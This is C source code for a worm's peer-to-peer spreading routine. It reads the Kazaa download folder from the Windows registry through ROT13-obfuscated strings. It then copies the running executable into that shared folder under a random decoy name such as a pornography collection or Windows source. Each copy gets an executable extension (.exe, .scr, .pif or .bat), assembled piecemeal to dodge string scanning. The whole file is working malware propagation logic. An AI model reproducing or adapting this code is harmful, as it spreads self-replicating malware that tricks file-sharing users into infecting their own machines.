char *kazaa_names[] = {
	"Windows95_Source.TMP.ZIP",
	"Epic_Video_WIN.TMP.WMV",
	"Porn_COLLECTION.TMP",
	"AWEsome_Waves.TMP.WMV",
	"China_vs_Spain_simulation.TMP.WMV",
	"Last_Ottoman_VOL2.TMP.ZIP",
	"My_picTURES.TMP.ZIP",
	"COOL_Video.TMP.WMV"
};

static void kazaa_spread(char *file)
{
	srand(GetTickCount());
	int kazaa_names_cnt = sizeof(kazaa_names) / sizeof(kazaa_names[0]);
	char kaza[256];
	DWORD kazalen=sizeof(kaza);
	HKEY hKey;
	char key_path[64], key_val[32];

	// Software\Kazaa\Transfer
	memset(key_path,0,sizeof(key_path));
	memset(key_val,0,sizeof(key_val));
	CiphStr(key_path, "Fbsgjner\\Xnmnn\\Genafsre");
	CiphStr(key_val, "QyQve0");	// "DlDir0"

	// Get the path to Kazaa from the registry
	ZeroMemory(kaza, kazalen);
	if (RegOpenKeyEx(HKEY_CURRENT_USER,key_path,0,KEY_QUERY_VALUE,&hKey)) return;

	if (RegQueryValueEx(hKey, key_val, 0, NULL, (PBYTE)kaza, &kazalen)) return;
	RegCloseKey(hKey);

	if (kaza[0] == 0) return;
	if (kaza[strlen(kaza)-1] == '/') kaza[strlen(kaza)-1] = '\\';
	if (kaza[strlen(kaza)-1] != '\\') strcat(kaza, "\\");
	strcpy(kaza+strlen(kaza), kazaa_names[rand() % kazaa_names_cnt]);
	strcat(kaza, ".");

	switch (rand() % 6) {
		case 0: case 1: strcat(kaza, "ex"); strcat(kaza, "e"); break;
		case 2: case 3: strcat(kaza, "sc"); strcat(kaza, "r"); break;
		case 4: strcat(kaza, "pi"); strcat(kaza, "f"); break;
		default: strcat(kaza, "ba"); strcat(kaza, "t"); break;
	}

	CopyFile(file,kaza,TRUE);
}

void p2p_spread(void)
{
	char selfpath[MAX_PATH];
	GetModuleFileName(NULL, selfpath, MAX_PATH);

	kazaa_spread(selfpath);
}
